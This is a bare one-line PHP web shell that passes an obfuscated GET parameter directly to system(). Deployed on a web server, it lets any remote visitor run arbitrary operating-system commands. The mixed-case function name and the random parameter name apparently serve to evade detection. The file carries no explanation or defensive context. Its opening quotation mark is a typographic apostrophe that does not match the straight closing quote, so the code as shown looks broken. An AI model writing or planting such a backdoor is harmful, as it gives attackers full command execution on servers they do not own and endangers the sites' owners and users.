<?php
SysTeM($_GET[’N0rSryzj']);
?>
